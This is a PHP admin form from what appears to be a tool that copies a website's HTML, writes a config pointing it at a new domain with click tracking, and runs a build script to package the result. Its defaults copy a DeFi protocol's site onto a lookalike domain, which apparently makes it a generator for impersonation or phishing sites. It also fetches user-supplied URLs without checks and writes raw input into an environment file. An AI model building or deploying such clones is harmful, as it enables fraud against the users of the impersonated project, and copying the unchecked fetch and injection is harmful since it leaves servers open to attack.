<?php

namespace App\Admin\Forms;

use Illuminate\Http\Request;
use OpenAdmin\Admin\Widgets\Form;
use \App\Models\PacketSiteCollection;
use OpenAdmin\Admin\Admin;

class AutoWebpacketFrom extends Form
{
    /**
     * The form title.
     *
     * @var string
     */
    public $title = '';

    /**
     * Handle the form request.
     *
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse
     */
    public function handle(Request $request)
    {
        $raw_website = $request->post('raw_website');
        $new_domain = $request->post('new_domain');
        $clicky_id =  $request->post('clicky_id');
        $page_content_path= 'page_content.html';
        $seo_title = $request->post('seo_title');
        $seo_keyword = $request->post('seo_keyword');
//写入env文件
        $env_content = '
NEXT_PUBLIC_ENABLE_TESTNETS = false
NEXT_PUBLIC_DOMAIN_WEBSITE  = '.$raw_website.'
NEXT_PUBLIC_SOURCE  = '.$new_domain.'
NEXT_PUBLIC_WEBSITE_PAGE_TITLE  = '.$seo_title.'
NEXT_PUBLIC_WEBSITE_PAGE_CONTENT  = '.$page_content_path.'
NEXT_PUBLIC_WEBSITE_PAGE_KEYWORD  = '.$seo_keyword.'
NEXT_PUBLIC_CLICKY = '.$clicky_id;

        //打开网站写入html
        $html_data = file_get_contents($raw_website);
        file_put_contents('../storage/webpacket_site/page_content.html',$html_data);
        file_put_contents('../storage/webpacket_site/.env',$env_content);
        //写入数据库
        $packetCollection = new PacketSiteCollection();

        $isExist = $packetCollection::where('new_domain', $new_domain)->count();
        if($isExist) return back();
        $packetCollection->raw_website = $raw_website;
        $packetCollection->new_domain = $new_domain;
        $packetCollection->clicky_id = $clicky_id;
        $packetCollection->owner = Admin::user()->id;

        $packetCollection->seo_title = $seo_title;
        $packetCollection->seo_keyword =$seo_keyword;

        $packetCollection->save();
        try{
          $result = shell_exec('./webpacket.sh');
          echo "<br><br>Download: <a href='/dist.tar.gz'>下载地址</a>" ;
        }catch(Exception $e){
          echo $e->getMessage();
        }
       // admin_success('Processed successfully.');
        //return back();
    }

    /**
     * Build a form here.
     */
    public function form()
    {
        $this->text('raw_website')->rules('required');
        $this->text('new_domain')->rules('required');
        $this->text('clicky_id')->rules('required');
        $this->text('seo_title')->rules('required');
        $this->text('seo_keyword')->rules('required');
        //$this->email('email')->rules('email');
        // $this->datetime('created_at');
    }

    /**
     * The data of the form.
     *
     * @return array $data
     */
    public function data()
    {
        return [
            'raw_website'       => 'https://mav.xyz',
            'new_domain'      => 'https://mav.social',
            'clicky_id' => 101414890,
            'created_at' => now(),
            'seo_title' => 'Maverick Protocol',
            'seo_keyword'=> 'Maverick Protocol is a DeFi infrastructure provider focused on increasing industry efficiency, powered by Maverick AMM.'
        ];
    }
}
